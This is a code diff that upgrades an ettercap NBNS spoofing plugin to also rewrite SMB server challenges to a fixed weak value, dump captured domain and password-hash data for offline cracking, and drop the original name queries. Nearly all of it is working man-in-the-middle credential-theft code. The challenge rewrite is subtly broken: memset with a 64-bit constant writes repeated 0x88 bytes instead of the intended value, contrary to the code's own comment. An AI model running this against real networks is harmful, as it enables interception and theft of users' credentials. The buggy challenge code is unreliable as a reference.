@@ -20,6 +20,7 @@
 */
 
 #include <ec.h>                        /* required for global variables */
+#include <ec_dissect.h>
 #include <ec_plugins.h>                /* required for plugin ops */
 #include <ec_file.h>
 #include <ec_hook.h>
@@ -145,12 +146,37 @@ struct nbns_spoof_entry {
 
 static SLIST_HEAD(, nbns_spoof_entry) nbns_spoof_head;
 
+/* 
+ * SMB portion
+ */
+
+typedef struct {
+   u_char  proto[4];
+   u_char  cmd;
+   u_char  err[4];
+   u_char  flags1;
+   u_short flags2;
+   u_short pad[6];
+   u_short tid, pid, uid, mid;
+} SMB_header;
+
+typedef struct {
+   u_char  mesg;
+   u_char  flags;
+   u_short len;
+} NetBIOS_header;
+
+#define IF_IN_PCK(x,y) if((x) >= y->packet && (x) < (y->packet + y->len) )
+
+
 /* protos */
 int plugin_load(void *);
 static int nbns_spoof_init(void *);
 static int nbns_spoof_fini(void *);
 static int load_db(void);
 static void nbns_spoof(struct packet_object *po);
+static void nbns_set_challenge(struct packet_object *po);
+static void nbns_print_jripper(struct packet_object *po);
 static int parse_line(const char *str, int line, char **ip_p, char **name_p);
 static int nbns_expand(char *compressed, char *dst);
 static int get_spoofed_nbns(const char *a, struct ip_addr **ip);
@@ -161,7 +187,7 @@ struct plugin_ops nbns_spoof_ops = {
 	.ettercap_version =  	EC_VERSION,
 	.name = 			"nbns_spoof",
 	.info = 			"Sends spoof NBNS replies & sends SMB challenges with custom challenge",
-	.version = 		"1.0",
+	.version = 			"1.1",
 	.init = 			&nbns_spoof_init,
 	.fini = 			&nbns_spoof_fini,	
 };
@@ -182,6 +208,8 @@ static int nbns_spoof_init(void *dummy)
 	 * this will pass only valid NBNS packets
   	 */
 	hook_add(HOOK_PROTO_NBNS, &nbns_spoof);
+	hook_add(HOOK_PROTO_SMB, &nbns_set_challenge);
+	hook_add(HOOK_PROTO_SMB_CMPLT, &nbns_print_jripper);
 	return PLUGIN_RUNNING;
 }
 
@@ -204,8 +232,7 @@ static int load_db(void)
 	f = open_data("etc", ETTER_NBNS, FOPEN_READ_TEXT);
 
 	if (f == NULL) {
-		USER_MSG("Cannot open %s", ETTER_NBNS);
-		return -EINVALID;
+		USER_MSG("Cannot open %s", ETTER_NBNS); return -EINVALID;
 	}
 	
 	while (fgets(line, 128, f)) {
@@ -239,7 +266,6 @@ static int load_db(void)
 	}
 
 	fclose(f);	
-
 	return ESUCCESS;
 }	
 
@@ -264,6 +290,61 @@ static int parse_line(const char *str, int line, char **ip_p, char **name_p)
 	*name_p = name;
 	*ip_p = ip;
 	return (1);
+}
+
+/*
+ * HOOK_POINT SMB
+ * Change the challenge sent by the server to something
+ * simple that can be decoded by other tools
+ */
+
+static void nbns_set_challenge(struct packet_object *po)
+{
+	u_char *ptr;
+	SMB_header *smb;
+	NetBIOS_header *NetBIOS;
+	
+	ptr = po->DATA.data;
+	u_int64 SMB_WEAK_CHALLENGE = 0x1122334455667788;
+
+	NetBIOS = (NetBIOS_header *)ptr;
+	smb = (SMB_header *)(NetBIOS + 1);
+
+	/* move to data */
+	ptr = (u_char *)(smb + 1);
+
+	if (memcmp(smb->proto, "\xffSMB", 4) != 0)
+		return;
+
+	if (smb->cmd == 0x72 && FROM_SERVER("smb", po)) {
+		if (ptr[3] & 2) {
+			/* Check encryption key len */
+			if (*ptr != 0) {
+				ptr += 3; /* Go to BLOB */
+				//memcpy new challenge (8 bytes) to ptr
+				memset(ptr, (long)SMB_WEAK_CHALLENGE, 8);
+				po->flags |= PO_MODIFIED; /* calculate checksum */
+				USER_MSG("nbns_spoof: Modified SMB challenge");
+			}
+		}
+	}
+}
+
+/*
+ * Hook point HOOK_PROTO_SMB_CMPLT
+ * receives a packet_object with the
+ * SMB username, password, challenge, etc.
+ */
+static void nbns_print_jripper(struct packet_object *po)
+{
+	//Domain = po->DISSECTOR.info
+	//User = po->DISSECTOR.user
+	//Pass = po->DISSECTOR.pass
+
+	/*
+         * Thanks to the SMB dissector, po->DISSECTOR.pass contains everything we need but domain
+         */
+	USER_MSG("%s%s", po->DISSECTOR.info, po->DISSECTOR.pass);
 }
 
 /* 
@@ -338,6 +419,10 @@ static void nbns_spoof(struct packet_object *po)
 	/* send fake reply */
 	send_udp(&GBL_IFACE->ip, &po->L3.src, po->L2.src, po->L4.dst, po->L4.src, response, NBNS_MSGLEN_QUERY_RESPONSE);
 	USER_MSG("nbns_spoof: Query [%s] spoofed to [%s]\n", name, ip_addr_ntoa(reply, tmp));
+
+	/* Do not forward request */
+	po->flags |= PO_DROPPED;
+
 	SAFE_FREE(response);
 	
 }
